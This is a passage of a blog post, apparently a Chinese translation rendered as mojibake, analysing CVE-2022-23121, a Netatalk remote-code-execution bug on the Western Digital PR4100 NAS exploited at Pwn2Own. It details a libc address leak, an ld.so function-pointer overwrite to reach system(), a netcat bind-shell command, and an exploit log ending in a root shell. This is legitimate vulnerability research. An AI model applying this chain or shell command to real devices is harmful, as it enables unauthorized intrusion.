</pre></table></code></div></div><p>å¦‚æœä½ çœ‹ä¸€ä¸‹ä¹‹å‰æåˆ°çš„<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>å‡½æ•°çš„ä»£ç ï¼Œä½ ä¼šæ³¨æ„åˆ°è¿™æ˜¯è‚¯å®šçš„ï¼Œå› ä¸ºæ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡<code class="language-plaintext highlighter-rouge">struct adouble adosx;</code>ï¼ˆå› æ­¤å­˜å‚¨äºæ ˆä¸Šï¼‰ä¿å­˜äº†AppleDoubleç»“æ„ä½“ï¼Œå¹¶ä¸€ç›´ä¼ é€’åˆ°äº†<code class="language-plaintext highlighter-rouge">ad_rebuild_adouble_header_osx()</code>å‡½æ•°ã€‚</p><p>æ‰€ä»¥è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿå¥½å§ï¼Œ<code class="language-plaintext highlighter-rouge">memcpy()</code>å‡½æ•°ä»ä¸€ä¸ªåŸºäºæ ˆçš„åç§»åœ°å€å†™å…¥32å­—èŠ‚è‡³æ–‡ä»¶åœ¨å†…å­˜ä¸­æ˜ å°„çš„åŒºåŸŸã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è®©ç¨‹åºå°†ä»»æ„çš„å†…å­˜å†…å®¹å†™å›ç£ç›˜ä¸Šçš„æ–‡ä»¶ä¸­ã€‚ä¹‹åæˆ‘ä»¬å¯ä»¥é€šè¿‡SMBè¯»å–forkæ–‡ä»¶çš„å†…å®¹ï¼ˆä»¥AppleDoubleæ ¼å¼å­˜å‚¨ï¼‰å¹¶ä¸”å¯ä»¥å°†è¿™éƒ¨åˆ†æ³„éœ²çš„å†…å®¹è¯»å‡ºæ¥ã€‚</p><p>è¿™éå¸¸å¥½ï¼Œä½†æ˜¯ç¨‹åºçš„æ ˆä¸Šæ˜¯å¦æœ‰<code class="language-plaintext highlighter-rouge">libc.so</code>åº“çš„åœ°å€æ³„éœ²å‡ºæ¥å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬æƒ³è¦è°ƒç”¨<code class="language-plaintext highlighter-rouge">libc.so</code>åº“ä¸­çš„<code class="language-plaintext highlighter-rouge">system()</code>å‡½æ•°ã€‚</p><p>äº‹å®è¯æ˜è¿™ç§åœ°å€æ˜¯æœ‰çš„ï¼Œå› ä¸º<code class="language-plaintext highlighter-rouge">main()</code>å‡½æ•°æ˜¯ä»<code class="language-plaintext highlighter-rouge">__libc_start_main()</code>å‡½æ•°ä¸­è¢«è°ƒç”¨çš„ï¼š</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>.text:0000000000023FB0 __libc_start_main proc near 
...
.text:0000000000024099                 call    rax             ; main()
.text:000000000002409B
.text:000000000002409B loc_2409B:                              ; CODE XREF: __libc_start_main+15Aâ†“j
.text:000000000002409B                 mov     edi, eax
.text:000000000002409D                 call    __GI_exit
</pre></table></code></div></div><h1 id="åˆå¹¶åˆ©ç”¨">åˆå¹¶åˆ©ç”¨</h1><p>åœ¨è¥¿éƒ¨æ•°æ®PR4100è®¾å¤‡çš„é»˜è®¤é…ç½®ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡AFPå’ŒSMBåè®®æ¥åœ¨è®¤è¯ä¹‹å‰è¯»å†™<code class="language-plaintext highlighter-rouge">Public</code>å…±äº«ç›®å½•ä¸­çš„ä»»æ„æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬è¿˜çŸ¥é“ï¼Œä¸€ä¸ª<code class="language-plaintext highlighter-rouge">afpd</code>å­è¿›ç¨‹æ˜¯ä»<code class="language-plaintext highlighter-rouge">afpd</code>çˆ¶è¿›ç¨‹forkè€Œæ¥ï¼Œç”¨æ¥å¤„ç†æ¯ä¸ªå®¢æˆ·ç«¯è¿æ¥çš„ã€‚è¿™æ„å‘³ç€æ¯ä¸ªå­è¿›ç¨‹å¯¹æ‰€æœ‰å·²ç»åŠ è½½çš„åº“éƒ½æœ‰ç›¸åŒçš„éšæœºæ€§ã€‚</p><p>ä¸ºäº†è§¦å‘è¯¥æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª<code class="language-plaintext highlighter-rouge">mooncake</code>å¸¸è§„æ–‡ä»¶å­˜åœ¨äºå…±äº«ç›®å½•ä¸­ï¼Œä»¥åŠä¸€ä¸ªç²¾å¿ƒæ„é€ çš„<code class="language-plaintext highlighter-rouge">._mooncake</code> forkæ–‡ä»¶å­˜åœ¨äºç›¸åŒçš„ç›®å½•ä¸­ã€‚ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡AFPè°ƒç”¨â€œFPOpenForkâ€å‘½ä»¤è®¿é—®<code class="language-plaintext highlighter-rouge">mooncake</code>æ–‡ä»¶ï¼Œè¯¥å‘½ä»¤ä¼šè§£æ<code class="language-plaintext highlighter-rouge">._mooncake</code> forkæ–‡ä»¶ï¼ˆä»¥AppleDoubleæ–‡ä»¶æ ¼å¼ä¿å­˜ï¼‰ã€‚æœ€ç»ˆå®ƒä¼šè°ƒç”¨<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°è´Ÿè´£å°†è‹¹æœçš„AppleDoubleæ–‡ä»¶è½¬æ¢ä¸ºä¸€ä¸ªæ›´ç®€å•çš„æ ¼å¼ç‰ˆæœ¬ã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»º<code class="language-plaintext highlighter-rouge">mooncake</code>æ–‡ä»¶ã€‚æˆ‘ä»¬é€šè¿‡AFPæ¥å£åˆ›å»ºï¼Œä½†æ˜¯æˆ‘ä»¬è®¤ä¸ºä¹Ÿå¯ä»¥é€šè¿‡SMBæ¥åˆ›å»ºã€‚ä¹‹åæˆ‘ä»¬æƒ³è§¦å‘ä¸¤æ¬¡æ¼æ´ã€‚</p><p>ç¬¬ä¸€æ¬¡ï¼Œæˆ‘ä»¬æ„é€ <code class="language-plaintext highlighter-rouge">._mooncake</code> forkæ–‡ä»¶æ¥æ»¥ç”¨<code class="language-plaintext highlighter-rouge">ad_rebuild_adouble_header_osx()</code>ä¸­çš„<code class="language-plaintext highlighter-rouge">memcpy()</code>å‡½æ•°ã€‚å½“è§¦å‘æ¼æ´æ—¶ï¼š</p><ul><li>åŸå§‹çš„<code class="language-plaintext highlighter-rouge">._mooncake</code> forkæ–‡ä»¶é€šè¿‡<code class="language-plaintext highlighter-rouge">mmap()</code>å‡½æ•°è¢«æ˜ å°„è¿›å†…å­˜<li><code class="language-plaintext highlighter-rouge">memcpy()</code>å‡½æ•°å°†<code class="language-plaintext highlighter-rouge">__libc_start_main()</code>å‡½æ•°çš„è¿”å›åœ°å€å†™å…¥è¢«æ˜ å°„çš„åŒºåŸŸ<li><code class="language-plaintext highlighter-rouge">munmap()</code>å‡½æ•°è¢«è°ƒç”¨ï¼Œä¸Šè¿°åœ°å€è¢«ä¿å­˜è¿›ç£ç›˜ä¸Šçš„<code class="language-plaintext highlighter-rouge">._mooncake</code> forkæ–‡ä»¶<li>æˆ‘ä»¬å¯ä»¥é€šè¿‡SMBåè®®è¯»å–<code class="language-plaintext highlighter-rouge">._mooncake</code> forkæ–‡ä»¶æ¥è·å–æ³„æ¼å‡ºçš„åœ°å€ï¼ˆå°±åƒè¯»å–å¸¸è§„æ–‡ä»¶ä¸€æ ·ï¼‰</ul><p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ¨æ–­å‡º<code class="language-plaintext highlighter-rouge">libc.so</code>çš„åŸºåœ°å€ï¼Œå¹¶ä¸”è®¡ç®—å‡º<code class="language-plaintext highlighter-rouge">system()</code>å‡½æ•°çš„åœ°å€ã€‚</p><p>ç¬¬äºŒæ¬¡ï¼Œæˆ‘ä»¬ç²¾å¿ƒæ„é€ <code class="language-plaintext highlighter-rouge">._mooncake</code> forkæ–‡ä»¶ï¼Œæ»¥ç”¨<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>å‡½æ•°ä¸­çš„<code class="language-plaintext highlighter-rouge">memmove()</code>å‡½æ•°ã€‚å½“è§¦å‘æ¼æ´æ—¶ï¼š</p><ul><li><code class="language-plaintext highlighter-rouge">._mooncake</code>åŸå§‹forkæ–‡ä»¶é€šè¿‡<code class="language-plaintext highlighter-rouge">mmap()</code>å‡½æ•°è¢«æ˜ å°„è¿›å†…å­˜<li><code class="language-plaintext highlighter-rouge">memmove()</code>å‡½æ•°è¦†ç›–äº†<code class="language-plaintext highlighter-rouge">ld.so</code>çš„<code class="language-plaintext highlighter-rouge">.data</code>æ®µï¼Œç ´å<code class="language-plaintext highlighter-rouge">rtld_local._dl_rtld_lock_recursive</code>å‡½æ•°æŒ‡é’ˆï¼Œå°†å…¶ç¯¡æ”¹ä¸º<code class="language-plaintext highlighter-rouge">system()</code>å‡½æ•°çš„åœ°å€ï¼Œç ´å<code class="language-plaintext highlighter-rouge">rtld_local._dl_load_lock</code>çš„æ•°æ®ï¼Œç¯¡æ”¹ä¸ºè¦æ‰§è¡Œçš„shellå‘½ä»¤<li>ç”±äºè®¿é—®äº†éæ³•çš„æœªæ˜ å°„çš„æ ˆåœ°å€ï¼Œ<code class="language-plaintext highlighter-rouge">memcpy()</code>å‡½æ•°å´©æºƒ<li>Netatalkçš„å¼‚å¸¸å¤„ç†å‡½æ•°è°ƒç”¨å¹¶è¿›å…¥<code class="language-plaintext highlighter-rouge">dl_open()</code>å‡½æ•°ï¼Œç”±äºä¸Šä¸€æ­¥å·²ç»ç¯¡æ”¹äº†ç›¸å…³å†…å®¹ï¼Œå› æ­¤ä¼šè°ƒç”¨<code class="language-plaintext highlighter-rouge">system()</code>å‡½æ•°ï¼Œå¹¶æ‰§è¡Œæˆ‘ä»¬æŒ‡å®šçš„ä»»æ„shellå‘½ä»¤</ul><p>æˆ‘ä»¬é¢„å…ˆé€šè¿‡SMBåè®®åœ¨å…±äº«ç›®å½•ä¸­æ”¾ç½®äº†ä¸€ä¸ªé™æ€å˜å¼‚çš„<code class="language-plaintext highlighter-rouge">netcat</code>ç¨‹åºï¼Œå¹¶é€šè¿‡ä»¥ä¸‹è·¯å¾„æ‰§è¡Œï¼š<code class="language-plaintext highlighter-rouge">/mnt/HD/HD_a2/Public/tools/netcat -nvlp 9999 -e /bin/sh</code>ã€‚</p><p>ä¸‹é¢æ˜¯æ¼æ´åˆ©ç”¨æ—¶çš„è¿‡ç¨‹ï¼š</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre># ./mooncake.py -i 192.168.1.3
(12:26:23) [*] Triggering leak...
(12:26:27) [*] Connected to AFP server
(12:26:27) [*] Leaked libc return address: 0x7f45e23f809b
(12:26:27) [*] libc base: 0x7f45e23d4000
(12:26:27) [*] Triggering system() call...
(12:26:27) [*] Using system address: 0x7f45e24189c0
(12:26:27) [*] Connected to AFP server
(12:26:29) [*] Connection timeout detected :)
(12:26:30) [*] Spawning a shell. Type any command.
uname -a
Linux MyCloudPR4100 4.14.22 #1 SMP Mon Dec 21 02:16:13 UTC 2020 Build-32 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) euid=501(nobody) egid=1000(share) groups=1000(share)
pwd
/mnt/HD/HD_a2/Public/edg
</pre></table></code></div></div><h2 id="pwn2own-ç¬”è®°">Pwn2Own ç¬”è®°</h2><p>å½“æ¯”èµ›æ—¶åˆ©ç”¨è¯¥æ¼æ´æ—¶ï¼Œç¬¬ä¸€æ¬¡å°è¯•å¤±è´¥åœ¨äº†åœ°å€æ³„éœ²é˜¶æ®µã€‚æˆ‘ä»¬çŒœæµ‹ç›¸æ¯”äºæˆ‘ä»¬è‡ªå·±çš„æµ‹è¯•ç¯å¢ƒï¼Œå¯èƒ½æ˜¯ç”±äºç›®æ ‡ç¯å¢ƒçš„æ—¶æœºé—®é¢˜æ‰€å¯¼è‡´çš„ã€‚å› æ­¤æˆ‘ä»¬ä¿®æ”¹äº†ä»£ç ï¼Œåœ¨æ³„éœ²åœ°å€ä¹‹å‰å¼•å…¥ä¸€ä¸ª<code class="language-plaintext highlighter-rouge">sleep()</code>ï¼Œä»¥ç¡®ä¿sambaæœ‰æ—¶é—´è¿”å›æˆ‘ä»¬é€šè¿‡æ¼æ´ä¿®æ”¹çš„æ•°æ®ã€‚æˆ‘ä»¬çš„ç¬¬äºŒæ¬¡å°è¯•è·å–äº†æ³„éœ²åœ°å€ï¼Œä½†æ˜¯å°è¯•é€šè¿‡telnetè¿æ¥ç›®æ ‡æ—¶å†æ¬¡å¤±è´¥äº†ï¼Œå› æ­¤æˆ‘ä»¬åœ¨è¿æ¥telnetä¹‹å‰åˆé¢å¤–æ·»åŠ äº†ä¸€ä¸ª<code class="language-plaintext highlighter-rouge">sleep()</code>ï¼Œä»¥ç¡®ä¿<code class="language-plaintext highlighter-rouge">system()</code>å‘½ä»¤è¢«æ­£ç¡®çš„æ‰§è¡Œã€‚å¹¸è¿çš„æ˜¯è¿™å¾ˆæœ‰æ•ˆï¼Œè¿™è¯´æ˜å•å•æ·»åŠ é¢å¤–çš„ä¼‘çœ æ—¶é—´è¶³ä»¥ä¿®å¤ä¸å¯é çš„æ¼æ´åˆ©ç”¨ï¼Œæˆ‘ä»¬åœ¨æˆ‘ä»¬æœ€åçš„ç¬¬ä¸‰æ¬¡å°è¯•æˆåŠŸäº†ğŸ™‚ã€‚</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pwn/'>pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-tag no-text-decoration" >æ¼æ´åˆ†æ</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=ã€ç¿»è¯‘ã€‘è¥¿éƒ¨æ•°æ®PR4100 NAS RCEæ¼æ´åˆ†æï¼ˆCVE-2022-23121ï¼‰ - gtrboy's blog&url=https://gtrboy.github.io/posts/CVE-2022-23121/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=ã€ç¿»è¯‘ã€‘è¥¿éƒ¨æ•°æ®PR4100 NAS RCEæ¼æ´åˆ†æï¼ˆCVE-2022-23121ï¼‰ - gtrboy's blog&u=https://gtrboy.github.io/posts/CVE-2022-23121/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=ã€ç¿»è¯‘ã€‘è¥¿éƒ¨æ•°æ®PR4100 NAS RCEæ¼æ´åˆ†æï¼ˆCVE-2022-23121ï¼‰ - gtrboy's blog&url=https://gtrboy.github.io/posts/CVE-2022-23121/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/bus/">ç‰©è”ç½‘è®¾å¤‡æ¶ˆæ¯æ€»çº¿æœºåˆ¶çš„ä½¿ç”¨åŠå®‰å…¨é—®é¢˜</a><li><a href="/posts/malloc/">mallocæºç å­¦ä¹ ï¼ˆglibc-2.23ï¼‰</a><li><a href="/posts/L_star/">L* ç®—æ³•å­¦ä¹ </a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/l-%E7%AE%97%E6%B3%95/">L*ç®—æ³•</a> <a class="post-tag" href="/tags/malloc%E6%BA%90%E7%A0%81/">mallocæºç </a> <a class="post-tag" href="/tags/pwnable-tw/">pwnable.tw</a> <a class="post-tag" href="/tags/%E6%B6%88%E6%81%AF%E6%80%BB%E7%BA%BF/">æ¶ˆæ¯æ€»çº¿</a> <a class="post-tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">æ¼æ´åˆ†æ</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/netatalk/"><div class="card-body"> <span class="timeago small" > Nov 8, 2021 <i class="unloaded">2021-11-08T08:20:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>pwnable.tw CVE-2018-1160</h3><div class="text-muted small"><p> pwnable.twäº2020å¹´æ–°å¢é¢˜ç›®CVE-2018-1160ï¼Œåˆ†å€¼100ï¼Œé¢˜ç›®æ›¾å‡ºç°åœ¨hitcon2019ï¼Œ1dayæ¼æ´åˆ©ç”¨ã€‚æ¼æ´æºè‡ªäºä¸€æ¬¾å¼€æºçš„è‹¹æœAFPï¼ˆApple Filing Protocolï¼‰åè®®æœåŠ¡å™¨ç¨‹åºNetatalkã€‚å’Œxuanxuanä¸€èµ·åšäº†è¿™é“é¢˜ã€‚ å¯å‚è€ƒwpå¦‚ä¸‹ï¼š CVE-2018-1160: Expanding the original...</p></div></div></a></div><div class="card"> <a href="/posts/L_star/"><div class="card-body"> <span class="timeago small" > Jul 27, 2021 <i class="unloaded">2021-07-27T17:20:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>L* ç®—æ³•å­¦ä¹ </h3><div class="text-muted small"><p> æœ¬ç¯‡æ—¨åœ¨è®°å½•è‡ªå·±å­¦ä¹ L*ç®—æ³•çš„è¿‡ç¨‹å’Œç†è§£ã€‚ å‚è€ƒï¼š å´ç¤¼å‘è€å¸ˆçš„ã€Šç½‘ç»œåè®®é€†å‘åˆ†æåŠåº”ç”¨ã€‹ L*ç®—æ³•åˆ›ä¸–æ–‡ï¼šLearning Regular Sets from Queries and Counterexamples* åŸºäºç±³åˆ©æœºçš„LM*ç®—æ³•ï¼šReverse Engineering Enhanced State Models of Black Box So...</p></div></div></a></div><div class="card"> <a href="/posts/malloc/"><div class="card-body"> <span class="timeago small" > Jul 25, 2021 <i class="unloaded">2021-07-25T17:20:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>mallocæºç å­¦ä¹ ï¼ˆglibc-2.23ï¼‰</h3><div class="text-muted small"><p> å­¦ä¹ glibc-2.23æºç ä¸­mallocç›¸å…³çŸ¥è¯†ï¼Œæ–‡ç« é¡ºåºå’Œmallocæµç¨‹ç›¸åŒã€‚æœ¬æ–‡ä»…ä¸ºè‡ªå·±ç¼•æ¸…æ€è·¯ç”¨ï¼Œå› æ­¤å¾ˆå¤šç»†èŠ‚å’ŒåŸºç¡€æ²¡æœ‰æ¶‰åŠï¼Œå¯èƒ½ä¼šæ¯”è¾ƒä¹±ã€‚è‹¥ä½ çœ‹åˆ°äº†è¿™ç¯‡æ–‡ç« ï¼Œæ¨èçœ‹ä¸‹é¢çš„åšå®¢ï¼Œä»‹ç»å¾—å¯èƒ½ä¼šæ›´åŠ ç»†è‡´ã€‚ å‚è€ƒï¼š Linuxå†…å­˜åˆ†é…å°ç»“â€“mallocã€brkã€mmap è‘£å“¥çš„é»‘æ¿æŠ¥ - å †æ¼æ´æŒ–æ˜ å †æ¼æ´æŒ–æ˜ä¸­çš„binsåˆ†ç±»(fastbinã€u...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/netatalk/" class="btn btn-outline-primary" prompt="Older"><p>pwnable.tw CVE-2018-1160</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> Â© 2022 <a href="">gtrboy</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/l-%E7%AE%97%E6%B3%95/">L*ç®—æ³•</a> <a class="post-tag" href="/tags/malloc%E6%BA%90%E7%A0%81/">mallocæºç </a> <a class="post-tag" href="/tags/pwnable-tw/">pwnable.tw</a> <a class="post-tag" href="/tags/%E6%B6%88%E6%81%AF%E6%80%BB%E7%BA%BF/">æ¶ˆæ¯æ€»çº¿</a> <a class="post-tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">æ¼æ´åˆ†æ</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://gtrboy.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script>
